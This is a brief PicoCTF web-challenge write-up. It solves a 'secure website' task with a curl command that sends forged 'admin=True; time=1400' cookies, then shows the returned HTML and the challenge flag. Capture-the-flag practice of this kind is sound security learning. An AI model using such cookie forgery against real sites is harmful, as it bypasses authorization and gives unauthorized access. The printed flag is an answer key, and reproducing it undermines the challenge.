```
This secure website allows users to access the flag only if they are admin and if the time is exactly 1400. https://jupiter.challenges.picoctf.org/problem/25189/ (link) or http://jupiter.challenges.picoctf.org:25189
```

If we go the that website we can see that we are required to be admin and a certain time to be set so I used curl to set a cookie and and we got the flag

```
curl https://jupiter.challenges.picoctf.org/problem/25189/flag -H "Cookie: admin=True; time=1400"
```

and here is the output

```
<!DOCTYPE html>
<html lang="en">

<head>
    <title>My New Website</title>


    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap.min.css" rel="stylesheet">

    <link href="https://getbootstrap.com/docs/3.3/examples/jumbotron-narrow/jumbotron-narrow.css" rel="stylesheet">


</head>

<body>

    <div class="container">
        <div class="header">
            <nav>
                <ul class="nav nav-pills pull-right">
                    <li role="presentation" class="active"><a href="/">Home</a>
                    </li>
                    <li role="presentation"><a href="/unimplemented">Sign In</a>
                    </li>
                    <li role="presentation"><a href="/unimplemented">Sign Out</a>
                    </li>
                </ul>
            </nav>
            <h3 class="text-muted">My New Website</h3>
        </div>

        <div class="jumbotron">
            <p class="lead"></p>
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code></code></p>
            <!-- <p><a class="btn btn-lg btn-success" href="admin" role="button">Click here for the flag!</a> -->
            <!-- </p> -->
        </div>


        <footer class="footer">
            <p>&copy; PicoCTF 2019</p>
        </footer>

    </div>
</body>
```

and here is the flag **picoCTF{0p3n_t0_adm1n5_fa4905c1}**